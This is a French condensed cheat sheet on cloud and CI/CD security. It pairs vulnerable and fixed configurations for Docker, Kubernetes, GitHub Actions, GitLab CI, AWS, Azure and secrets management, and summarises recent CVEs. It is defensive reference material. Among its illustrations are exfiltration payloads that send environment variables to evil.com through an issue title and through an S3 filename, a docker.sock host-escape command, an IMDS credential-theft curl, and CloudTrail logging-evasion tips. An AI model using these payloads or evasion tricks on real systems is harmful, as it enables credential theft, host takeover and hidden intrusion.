# Cloud / CI-CD Security 2025-2026 — Condensé

## DOCKER / RUNTIME CONTENEURS

### CVEs runc critiques
| CVE | CVSS | Description | Fix |
|-----|------|-------------|-----|
| CVE-2025-31133 | — | Race : `/dev/null` → symlink → `core_pattern` → code exec hôte | runc v1.2.8+ |
| CVE-2025-52881 | — | **Contourne tous les LSMs**, redirige vers procfs → full host. Affecte crun/youki | runc v1.2.8+ |
| CVE-2025-52565 | — | `/dev/console` bind-mount race → écriture procfs | runc v1.2.8+ |
| CVE-2025-9074 | 9.3 | Docker Desktop : API `192.168.65.7:2375` sans auth → 2 HTTP POST = takeover hôte | Docker Desktop 4.44.3 |
| CVE-2025-47290 | 7.6 | containerd TOCTOU image unpacking → écriture hors container | containerd 2.1.1 |
| CVE-2024-21626 | — | "Leaky Vessels" : fd leak via `WORKDIR /proc/self/fd/7/` → filesystem hôte. Metasploit dispo | runc ≥1.1.12 |

### Dockerfile anti-patterns — VULN/FIX

**Privileged**
```yaml
# VULN
privileged: true
# FIX
read_only: true
security_opt: [no-new-privileges:true]
cap_drop: [ALL]
cap_add: [NET_BIND_SERVICE]
```

**Secret en ARG/layer** (persiste après `rm`)
```dockerfile
# VULN
ARG NPM_TOKEN
RUN echo "//registry.npmjs.org/:_authToken=${NPM_TOKEN}" > .npmrc && pip install pkg && rm .npmrc
# FIX — BuildKit secret mount (jamais écrit en layer)
RUN --mount=type=secret,id=npmrc,target=/root/.npmrc pip install pkg
# docker build --secret id=npmrc,src=$HOME/.npmrc -t myapp .
```

**Socket Docker** (`/var/run/docker.sock` = root hôte)
```bash
# Exploit: docker run -it -v /:/host/ ubuntu chroot /host/ bash
# FIX: proxy filtrant tecnativa/docker-socket-proxy (POST: 0)
```

**Image non pinnée** → `FROM ubuntu:22.04@sha256:703218c...` (digest immuable)

---

## KUBERNETES

### CVE-2025-1974 "IngressNightmare" (CVSS 9.8)
- **40% des clusters cloud** affectés. ingress-nginx admission controller.
- Accès réseau pod → upload lib via NGINX client body buffers vers `/proc` → injection `ssl_engine` via annotation → NGINX charge la lib → **RCE + accès tous les secrets de tous les namespaces**.
- Fix : ingress-nginx **v1.12.1+ / v1.11.5+**.
- CVEs liés : CVE-2025-1097/1098/24514 (CVSS 8.8) — config injection via annotations non sanitisées.

### RBAC — VULN/FIX
```yaml
# VULN — wildcard = cluster-admin
roleRef:
  kind: ClusterRole
  name: cluster-admin
# FIX — namespace-scoped, verbs précis
kind: Role
metadata:
  namespace: app-namespace
rules:
- apiGroups: [""]
  resources: ["pods", "services"]
  verbs: ["get", "list", "watch"]
```
ServiceAccount : `automountServiceAccountToken: false` par défaut.

**Pod hardening** : `automountServiceAccountToken: false`, `hostPID/Network/IPC: false`, `runAsNonRoot: true`, `allowPrivilegeEscalation: false`, `readOnlyRootFilesystem: true`, `capabilities: {drop: ["ALL"]}`, `seccompProfile: RuntimeDefault`, `resources.limits` obligatoires. Enforce cluster-wide : `pod-security.kubernetes.io/enforce: restricted`.

### Secrets K8s = base64, pas chiffré
```bash
kubectl get secret db-creds -o jsonpath='{.data.password}' | base64 -d  # decode immédiat
```
**FIX 1 — etcd encryption at rest**
```yaml
kind: EncryptionConfiguration
resources:
- resources: [secrets]
  providers:
  - aescbc:
      keys: [{name: key1, secret: <base64-32-bytes>}]
  - identity: {}
```
**FIX 2 — External Secrets Operator (prod)**
```yaml
kind: ExternalSecret
spec:
  refreshInterval: "15m"
  secretStoreRef: {name: vault-backend, kind: SecretStore}
  data:
  - secretKey: password
    remoteRef: {key: production/database, property: password}
```

**Kubelet (port 10250)** : 287 000 exposés Shodan, ~100 en anonyme. Fix : `authentication.anonymous.enabled: false`, `readOnlyPort: 0`, `authorization.mode: Webhook`.

---

## CI/CD PIPELINES

### CVE-2025-30066 "tj-actions/changed-files" (CVSS 8.6)
- **23 000+ repos** affectés, 12-15 mars 2025. Tags modifiés rétroactivement → dump mémoire runner → AWS keys, PATs, tokens RSA dans logs.
- Chaîne : CVE-2025-30154 (reviewdog) compromis via invitation automatique → leak PAT → tj-actions.
- Cible initiale : Coinbase/agentkit. CISA KEV 18 mars. Seulement **3,9%** des repos pinnent sur SHA.

### Expression Injection GitHub Actions
```yaml
# VULN — RCE via titre d'issue
- run: echo "New issue: ${{ github.event.issue.title }}"
# Attaque: titre = "; curl evil.com/steal?t=$(env|base64) #"

# FIX — var d'env intermédiaire
- env:
    ISSUE_TITLE: ${{ github.event.issue.title }}
  run: echo "New issue: $ISSUE_TITLE"
```
CVEs réels : CVE-2025-53104 (CVSS 9.1), CVE-2025-61671 (CVSS 9.3).

### pull_request_target — Fork code + secrets
```yaml
# VULN
on: pull_request_target
steps:
  - uses: actions/checkout@v4
    with:
      ref: ${{ github.event.pull_request.head.sha }}  # Code fork!
  - run: npm test
    env:
      DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}

# FIX — workflow 1 build sans secrets
on: pull_request
steps:
  - uses: actions/checkout@v4
  - run: npm test
  - uses: actions/upload-artifact@v4
    with: {name: build-output, path: dist/}
# Workflow 2 — déclenché par workflow_run, ne checkout JAMAIS le fork
```

### SHA Pinning + OIDC
```yaml
# VULN
- uses: tj-actions/changed-files@v45
# FIX
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2

# OIDC — remplace credentials longue durée
permissions:
  id-token: write
- uses: aws-actions/configure-aws-credentials@e3dd6a...
  with:
    role-to-assume: arn:aws:iam::123456789012:role/github-actions-deploy
```
Trust policy AWS : `"token.actions.githubusercontent.com:sub": "repo:my-org/my-repo:ref:refs/heads/main"`.

**GITHUB_TOKEN** : `permissions: {}` au niveau workflow, grant par job. SLSA Level 3 : `slsa-framework/slsa-github-generator`.

### GitLab CI — Cache Poisoning Cross-Branch
```yaml
# VULN — cache partagé toutes branches
cache:
  key: "build-cache"
# FIX
cache:
  key: "${CI_JOB_NAME}-${CACHE_SECRET}"  # variable protégée
  policy: pull  # read-only pour MRs
```

---

## CLOUD PROVIDERS

### SSRF → IMDS — Pattern #1 (AWS)
```bash
# IMDSv1 — aucune auth
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole
# → AccessKeyId + SecretAccessKey + Token
```
CVE-2025-51591 (Pandoc SSRF → IMDS, exploité août-sept 2025). ~50% des EC2 enforçent IMDSv2.

```hcl
# FIX Terraform
resource "aws_instance" "secure" {
  metadata_options {
    http_tokens                 = "required"
    http_put_response_hop_limit = 1
  }
}
```
SCP org-wide : `"Deny" ec2:RunInstances si MetadataHttpTokens != "required"`.

### IAM God-mode + STS Chaining
```json
// VULN
{ "Effect": "Allow", "Action": "*", "Resource": "*" }
// FIX
{ "Effect": "Allow", "Action": ["s3:GetObject"], "Resource": "arn:aws:s3:::bucket/path/*" }
```
STS chaining : `aws sts assume-role` progressif → admin cross-account. Mitigation : `aws:PrincipalOrgID`, MFA, IAM Access Analyzer.

### Lambda — Injection S3 filename
```python
# VULN
subprocess.run(f"file /tmp/{key}", shell=True)
# Attaque: "file;curl evil.com?$(env|base64);.txt"
# FIX
SAFE_PATTERN = re.compile(r'^[a-zA-Z0-9._\-/]+$')
if not SAFE_PATTERN.match(key): raise ValueError(...)
s3_client.head_object(Bucket=bucket, Key=key)
```

### Azure — CVE-2025-55241 (CVSS 10.0)
- Azure AD Graph API "Actor tokens" : cross-tenant sans vérification tenant → **usurpation Global Admin, bypass MFA + Conditional Access, aucun log dans le tenant victime**.
- API retirée le 31 août 2025.

### CloudTrail Evasion
- Policies > 102 401 chars → omission silencieuse "requestParameters too large" (Permiso, jan 2025).
- `PutEventSelectors` désactive les management events. Endpoints "gamma" AWS non-production peuvent ne pas logger.

---

## SECRETS MANAGEMENT

**Stats** : 88% breaches = credentials compromis. 65% cloud breaches = accès initial via leak. 59% IAM AWS / 55% SA GCP / 40% Entra ID : clés > 1 an.

### 5 Anti-patterns critiques
1. **`.env` commité** → git history permanente. Fix : `.gitignore` + truffleHog/GitGuardian.
2. **`docker run -e SECRET=...`** → visible `/proc/<pid>/environ`. Fix : Docker secrets / file mounts.
3. **`logger.debug(api_key)`** → secrets dans ELK/CloudWatch. Fix : redaction filters.
4. **`COPY .env` / `ARG PASSWORD`** dans Dockerfile → layer immuable. Fix : BuildKit `--mount=type=secret`.
5. **Credentials hardcodés** → SDK credential chain (`boto3.client("s3")` utilise IAM role/OIDC auto).

**Vault** : `seal "awskms" { kms_key_id = "alias/vault-unseal-key" }`. Policy : `path "secret/data/myapp/*" { capabilities = ["read"] }`. Anti-pattern : wildcard `path "*"` avec tous les capabilities.

**SOPS** (CNCF) : chiffre valeurs uniquement, clés visibles → git-friendly. `sops -e -i secrets.yaml` / `sops -d | kubectl apply`.

**External Secrets Operator** (CNCF) : bridge Vault/AWS/GCP/Azure → K8s Secrets. `refreshInterval` < période rotation.
